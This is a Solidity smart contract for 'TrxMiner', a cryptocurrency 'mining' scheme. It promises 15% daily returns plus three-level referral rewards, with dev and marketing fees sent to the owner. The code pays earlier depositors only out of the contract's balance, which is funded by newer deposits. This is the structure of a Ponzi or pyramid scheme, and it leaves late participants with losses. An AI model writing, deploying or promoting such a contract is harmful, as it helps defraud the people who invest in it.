pragma solidity ^0.4.25;
/*
* TrxMiner Contract
* TrxMiner B3P Team © 2019
* [✓] 15% Daily
* [✓] 3% Dev fee
* [✓] 3% marketing fee
* [✓] 10% Ref rewards (5,3,2)
*
*/
contract P3BTrxminer{

    using SafeMath for uint256;

    uint constant PERIOD = 1 minutes;

    uint public totalMiners;
    uint public totalPayout;
    uint private minDepositSize = 10000000;
    uint private minuteInterestRateDivisor = 100000000;
    uint private devCommission = 3;
    uint private marketingComission = 3;
    uint private commissionDivisor = 100;
    uint private minuteRate=10416;
    bool private initialState;

    address private owner = 0x55E2ae71E381525eed3148725165424d16525A62;
    address private devAddress = 0x1f5B807C02e559b884729455497ce63262816fd3;
    address private marketingAddress = 0x1f5B807C02e559b884729455497ce63262816fd3 ;
    struct Miner {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
    }

    mapping(address => Miner) public miners;

    constructor() public {
      owner = msg.sender;
      devAddress = msg.sender;
      marketingAddress = msg.sender;
      initialState = true;
    }


    function register(address _addr, address _affAddr) private{

      Miner storage miner = miners[_addr];

      miner.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = miners[_affAddr1].affFrom;
      address _affAddr3 = miners[_affAddr2].affFrom;

      miners[_affAddr1].aff1sum = miners[_affAddr1].aff1sum.add(1);
      miners[_affAddr2].aff2sum = miners[_affAddr2].aff2sum.add(1);
      miners[_affAddr3].aff3sum = miners[_affAddr3].aff3sum.add(1);
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(msg.value >= minDepositSize);
        if(initialState) {
            require(owner == msg.sender, "only allowed address");
            initialState=false;
        }
        uint depositAmount = msg.value;

        Miner storage miner = miners[msg.sender];

        if (miner.time == 0) {
            miner.time = now;
            totalMiners++;
            if(_affAddr != address(0) && miners[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }

        collect(msg.sender);
        miner.trxDeposit = miner.trxDeposit.add(depositAmount);
        distributeRef(msg.value, miner.affFrom);

        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        devAddress.transfer(devEarn);
        uint marketingReserve = depositAmount.mul(marketingComission).div(commissionDivisor);
        marketingAddress.transfer(marketingReserve);
    }

    function withdraw() public {
        collect(msg.sender);
        require(miners[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, miners[msg.sender].interestProfit);
    }

    function upgrade() public{
        Miner storage miner = miners[msg.sender];
        collect(msg.sender);

        require(miner.interestProfit > minDepositSize);
        uint contractBalance = address(this).balance;
        require(contractBalance>0);
        uint upgradeValue = miner.interestProfit > contractBalance ? contractBalance : miner.interestProfit;
        miner.interestProfit = miner.interestProfit.sub(upgradeValue);
        miner.trxDeposit = miner.trxDeposit.add(upgradeValue);

        uint devEarn = upgradeValue.mul(devCommission).div(commissionDivisor);
        devAddress.transfer(devEarn);
        uint marketingReserve = upgradeValue.mul(marketingComission).div(commissionDivisor);
        marketingAddress.transfer(marketingReserve);
    }

    function collect(address _addr) internal {
        Miner storage miner = miners[_addr];

        uint minutePassed = ( now.sub(miner.time) ).div(PERIOD);
        if (minutePassed > 0 && miner.time > 0) {
            uint collectProfit = (miner.trxDeposit.mul(minutePassed.mul(minuteRate))).div(minuteInterestRateDivisor);
            miner.interestProfit = miner.interestProfit.add(collectProfit);
            miner.time = miner.time.add( minutePassed.mul(PERIOD) );
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Miner storage miner = miners[_receiver];
                miner.payoutSum = miner.payoutSum.add(payout);
                miner.interestProfit = miner.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(10)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = miners[_affAddr1].affFrom;
        address _affAddr3 = miners[_affAddr2].affFrom;
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            _allaff = _allaff.sub(_affRewards);
            miners[_affAddr1].affRewards = _affRewards.add(miners[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            _allaff = _allaff.sub(_affRewards);
            miners[_affAddr2].affRewards = _affRewards.add(miners[_affAddr2].affRewards);
            _affAddr2.transfer(_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            miners[_affAddr3].affRewards = _affRewards.add(miners[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
       }

        if(_allaff > 0 ){
            owner.transfer(_allaff);
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address minerAddress= _addr;
      Miner storage miner = miners[minerAddress];
      require(miner.time > 0);

      uint minutePassed = ( now.sub(miner.time) ).div(PERIOD);
      if (minutePassed > 0) {
          uint collectProfit = (miner.trxDeposit.mul(minutePassed.mul(minuteRate))).div(minuteInterestRateDivisor);
      }
      return collectProfit.add(miner.interestProfit);
    }

}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

